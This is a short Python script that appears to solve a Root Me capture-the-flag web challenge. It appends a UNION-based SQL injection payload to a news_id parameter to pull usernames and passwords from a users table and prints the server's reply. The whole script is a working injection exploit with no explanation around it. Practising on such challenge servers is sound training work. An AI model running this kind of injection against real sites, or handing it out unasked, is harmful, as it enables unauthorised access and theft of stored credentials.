import requests

session = requests.session()
url = 'http://challenge01.root-me.org:80/web-serveur/ch18/?action=news&news_id=1'
payload = ' union select 1,username,password from users--'

r = session.get(url+payload)
print(r.text)